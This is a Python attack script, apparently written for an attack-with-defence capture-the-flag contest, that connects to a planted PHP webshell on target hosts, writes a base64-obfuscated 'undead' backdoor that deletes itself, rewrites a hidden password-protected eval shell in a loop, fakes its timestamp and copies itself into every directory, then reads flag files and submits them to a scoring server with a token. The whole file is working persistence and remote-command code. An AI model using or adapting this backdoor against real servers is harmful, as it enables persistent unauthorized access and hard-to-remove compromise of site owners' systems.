# -*- coding: utf-8 -*-
# 作者    : 轩昂妄想
# 文件    : Link_the_Trojan.py
# 时间    : 2022/10/6 15:39
# -----------------------------------------------------------------------------------
import requests
import re
import time
import urllib.parse

# busi = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iY2YzNmE4M2JlN2M0MDM3NmFkYWQ5ZDBhYmIzNmFjYzAiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOwp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIxLTEyLTAxIDA5OjEwOjEyIiAuY29uZjFnLnBocCcpOwogICAgc3lzdGVtKCJlY2hvICdkSEpoZG1WeVpHbHlLQ2tvY0hWemFHUWdJaVF4SWlBK0lDOWtaWFl2Ym5Wc2JDQXlQaVl4TzJadmNpQm1hV3hsSUdsdUlHQnNjeUF0TVdBN1pHOGdhV1lnZEdWemRDQXRaQ0FpSkdacGJHVWlPM1JvWlc0Z1kzQWdKRkJYUkM4dVkyOXVaakZuTG5Cb2NDQWtVRmRFTHlSbWFXeGxPMlZqYUc4Z0lpUlFWMFF2SkdacGJHVWlPM1J5WVhabGNtUnBjaUFpSkdacGJHVWlJQ0lrS0NoMFlXSWdLeUF4SUNBcEtTSTdabWs3Wkc5dVpTazdkSEpoZG1WeVpHbHknIHwgYmFzZTY0IC1kID4gMS5zaCIpOwogICAgJGFzZCA9IHN5c3RlbSgiYmFzaCAxLnNoIik7CiAgICB1c2xlZXAoMTAwMCk7Cn0=' | base64 -d > conf1g.php");'''
busima = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iODAwYzE3MzA5NmIzNzhhNGYzYzcyNGYyOWRiMzQwNjkiKXtAZXZhbCgkX1BPU1RbImJ1c2kiXSk7fSA/Pic7CndoaWxlICgxKXsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgIHN5c3RlbSgndG91Y2ggLW0gLWQgIjIwMjEtMTItMDEgMDk6MTA6MTIiIC5jb25mMWcucGhwJyk7CiAgICBzeXN0ZW0oImVjaG8gJ2RISmhkbVZ5WkdseUtDa29jSFZ6YUdRZ0lpUXhJaUErSUM5a1pYWXZiblZzYkNBeVBpWXhPMlp2Y2lCbWFXeGxJR2x1SUdCc2N5QXRNV0E3Wkc4Z2FXWWdkR1Z6ZENBdFpDQWlKR1pwYkdVaU8zUm9aVzRnWTNBZ0pGQlhSQzh1WTI5dVpqRm5MbkJvY0NBa1VGZEVMeVJtYVd4bE8yVmphRzhnSWlSUVYwUXZKR1pwYkdVaU8zUnlZWFpsY21ScGNpQWlKR1pwYkdVaUlDSWtLQ2gwWVdJZ0t5QXhJQ0FwS1NJN1ptazdaRzl1WlNrN2RISmhkbVZ5WkdseScgfCBiYXNlNjQgLWQgPiAyLnNoIik7CiAgICAkYXNkID0gc3lzdGVtKCJiYXNoIDEuc2giKTsKICAgIHVzbGVlcCgxMDAwKTsKfQo=' | base64 -d > conf1g.php");'''
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
}

path1 = "/upload/0/file/202210/123.php"  # 小木马位置
path = "/upload/0/file/202210/.conf1g.php?pwd=busi"  # 不死马位置
path2 = "/upload/0/file/202210/conf1g.php" # 激活不死马

passwd1 = "aaa"  # 小木马密码
passwd = "busi" # 不死马密码

data = {
    passwd1: busima  # 输入命令，按照需要修改(写入不死马)
}

payload = {
    # passwd: 'print_r(readfile(\'/home/ctf/123\'));'  # 输入命令，按照需要修改(不死马)
    passwd: "system('cat /home/ctf/123');"
}

# 写入不死马
file = open("busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
# data = {
#     passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"  # 写入不死马
# }

# 读取IP
# file = open('../Information collection/ip_result_of_scanning.txt', "r")
# ip_list = file.read().splitlines()
# file.close()

ip_list = ["http://192.168.56.135/awd"]  # 目标ip地址

def resume():
    for i in ip_list:
        url = i + path2
        response = requests.post(url, headers=headers, timeout=1)  # 写入不死马



def shell():
    for i in ip_list:
        try:
            url1 = i + path1
            print(url1)
            response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令
            url = i + path
            try:
                resume()
            except requests.exceptions.RequestException as e:
                pass
            print(url)
            response = requests.post(url, data=payload, headers=headers, timeout=3)  # 写入不死马
            print(response.text)

            # # print(i+"e/search/result/1.php?s=print_r(readfile(%27../../../../home/ctf/flag%27))")
            # print(code)


            # flags = (re.search("flag{.*}", response.text).group(0)[:38])
            # print(flags)
            # flag_list(flags)

        except requests.exceptions.RequestException as e:
            resume()
            print("失去链接:" + i)


path_get = "?shell=print_r(readfile(\'flag\'));"


def shell1():
    for i in ip_list:
        try:
            url = i + path_get
            response = requests.get(url, headers=headers, timeout=1)
            flags = (re.search("flag{.*}", response.text).group(0)[:38])
            print(flags)
            flag_list(flags)

        except requests.exceptions.RequestException as e:
            print("失去链接:" + i)


def flag_submit():
    f = open('flag.txt', "r")
    flag_list = f.read().splitlines()
    for i in flag_list:
        results = requests.get(   # token 根据场景更改
            "https://ctf.bugku.com/awd/submit.html?token=c2c1e4d002daa9eea931888935b0dd86&flag=" + str(i))
        print(results.text)
    f.close()


def flag_list(flags):
    flag = open('flag.txt', "a")
    flag.write('{}\n'.format(flags))
    flag.close()


while True:
    for i in ip_list:
        shell()
        # shell1()
        # flag_submit()
    # time.sleep(10)
